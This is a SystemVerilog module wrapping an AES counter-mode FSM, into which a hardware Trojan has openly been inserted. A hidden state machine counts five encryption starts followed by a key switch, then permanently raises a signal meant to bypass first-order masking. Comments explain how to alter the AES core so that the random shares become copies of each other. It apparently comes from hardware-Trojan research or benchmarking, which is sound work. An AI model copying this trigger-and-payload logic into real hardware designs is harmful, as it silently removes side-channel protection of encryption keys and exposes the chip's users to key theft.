module aes_ctr_fsm_p import aes_pkg::*;
(
  input  logic                     clk_i,
  input  logic                     rst_ni,

  input  logic                     incr_i,          // Sparsify
  output logic                     ready_o,         // Sparsify
  input  logic                     incr_err_i,
  input  logic                     mr_err_i,
  output logic                     alert_o,

  output logic [SliceIdxWidth-1:0] ctr_slice_idx_o,
  input  logic  [SliceSizeCtr-1:0] ctr_slice_i,
  output logic  [SliceSizeCtr-1:0] ctr_slice_o,
  output logic                     ctr_we_o,

  // TROJAN INSERTION: Added ports to communicate with the key management for Trojan
  input  logic                     enc_start_i,     // Asserted by SW to start encryption
  input  logic                     key_switch_i,    // Asserted by SW to switch key
  // These two signals should be connected to upper-level controller or SoC software
  output logic                     trojan_active_o  // Debug: flag for Trojan active state (can be removed in deployed version)
);

  /////////////////////
  // Input Buffering //
  /////////////////////

  localparam int NumInBufBits = $bits({
    incr_i,
    incr_err_i,
    mr_err_i,
    ctr_slice_i
  });

  logic [NumInBufBits-1:0] in, in_buf;

  assign in = {
    incr_i,
    incr_err_i,
    mr_err_i,
    ctr_slice_i
  };

  // This primitive is used to place a size-only constraint on the
  // buffers to act as a synthesis optimization barrier.
  prim_buf #(
    .Width(NumInBufBits)
  ) u_prim_buf_in (
    .in_i(in),
    .out_o(in_buf)
  );

  logic                    incr;
  logic                    incr_err;
  logic                    mr_err;
  logic [SliceSizeCtr-1:0] ctr_i_slice;

  assign {incr,
          incr_err,
          mr_err,
          ctr_i_slice} = in_buf;

  // Intermediate output signals
  logic                     ready;
  logic                     alert;
  logic [SliceIdxWidth-1:0] ctr_slice_idx;
  logic  [SliceSizeCtr-1:0] ctr_o_slice;
  logic                     ctr_we;

  ////////////////////////
  // TROJAN State Logic //
  ////////////////////////

  // Trojan state:
  //   1. Count consecutive encryptions (enc_start_i)
  //   2. If count reaches 5, and immediately key_switch_i asserted, trigger payload
  //   3. Reset on rst_ni deassertion

  typedef enum logic [1:0] {
    TROJ_IDLE    = 2'b00,
    TROJ_ARMED   = 2'b01,
    TROJ_TRIGGER = 2'b10
  } troj_state_e;

  troj_state_e troj_state_q, troj_state_d;

  logic [2:0] enc_cnt_q, enc_cnt_d;

  // Trojan state/registers reset
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      troj_state_q <= TROJ_IDLE;
      enc_cnt_q    <= 3'd0;
    end else begin
      troj_state_q <= troj_state_d;
      enc_cnt_q    <= enc_cnt_d;
    end
  end

  always_comb begin
    troj_state_d = troj_state_q;
    enc_cnt_d    = enc_cnt_q;

    case (troj_state_q)
      TROJ_IDLE: begin
        troj_state_d = TROJ_IDLE;
        enc_cnt_d    = 3'd0;
        if (enc_start_i) begin
          enc_cnt_d    = 3'd1;
          troj_state_d = TROJ_ARMED;
        end
      end

      TROJ_ARMED: begin
        if (enc_start_i && (enc_cnt_q < 3'd5)) begin
          enc_cnt_d    = enc_cnt_q + 3'd1;
          troj_state_d = TROJ_ARMED;
        end else if (!enc_start_i && (enc_cnt_q < 3'd5)) begin
          enc_cnt_d    = enc_cnt_q;
          troj_state_d = TROJ_ARMED;
        end else if ((enc_cnt_q == 3'd5) && key_switch_i) begin
          troj_state_d = TROJ_TRIGGER;
          enc_cnt_d    = enc_cnt_q;
        end else if ((enc_cnt_q == 3'd5) && !key_switch_i) begin
          // Wait for key_switch_i asserted
          troj_state_d = TROJ_ARMED;
          enc_cnt_d    = enc_cnt_q;
        end else begin
          // Any unexpected behavior resets Trojan
          troj_state_d = TROJ_IDLE;
          enc_cnt_d    = 3'd0;
        end
      end

      TROJ_TRIGGER: begin
        // Remain in trigger state until reset
        troj_state_d = TROJ_TRIGGER;
        enc_cnt_d    = enc_cnt_q;
      end

      default: begin
        troj_state_d = TROJ_IDLE;
        enc_cnt_d    = 3'd0;
      end
    endcase
  end

  assign trojan_active_o = (troj_state_q == TROJ_TRIGGER);  // Debug / for test visibility

  /////////////////
  // Regular FSM //
  /////////////////

  // TROJAN INSERTION: Trojan payload signal
  wire trojan_mask_bypass;
  assign trojan_mask_bypass = (troj_state_q == TROJ_TRIGGER);

  // Instantiate AES core FSM with payload: added 'trojan_mask_bypass' port
  aes_ctr_fsm u_aes_ctr_fsm (
    .clk_i           ( clk_i         ),
    .rst_ni          ( rst_ni        ),

    .incr_i          ( incr          ),
    .ready_o         ( ready         ),
    .incr_err_i      ( incr_err      ),
    .mr_err_i        ( mr_err        ),
    .alert_o         ( alert         ),

    .ctr_slice_idx_o ( ctr_slice_idx ),
    .ctr_slice_i     ( ctr_i_slice   ),
    .ctr_slice_o     ( ctr_o_slice   ),
    .ctr_we_o        ( ctr_we        ),

    // TROJAN INSERTION: Bypass signal to disable 1st-order masking in RTL below
    .trojan_mask_bypass_i ( trojan_mask_bypass )
    // The AES core module must be modified elsewhere to accept/use this port,
    // e.g. by instead of generating two random data shares, copy share0 to share1 when this is asserted.
  );

  //////////////////////
  // Output Buffering //
  //////////////////////

  localparam int NumOutBufBits = $bits({
    ready_o,
    alert_o,
    ctr_slice_idx_o,
    ctr_slice_o,
    ctr_we_o
  });

  logic [NumOutBufBits-1:0] out, out_buf;

  assign out = {
    ready,
    alert,
    ctr_slice_idx,
    ctr_o_slice,
    ctr_we
  };

  // This primitive is used to place a size-only constraint on the
  // buffers to act as a synthesis optimization barrier.
  prim_buf #(
    .Width(NumOutBufBits)
  ) u_prim_buf_out (
    .in_i(out),
    .out_o(out_buf)
  );

  assign {ready_o,
          alert_o,
          ctr_slice_idx_o,
          ctr_slice_o,
          ctr_we_o} = out_buf;

endmodule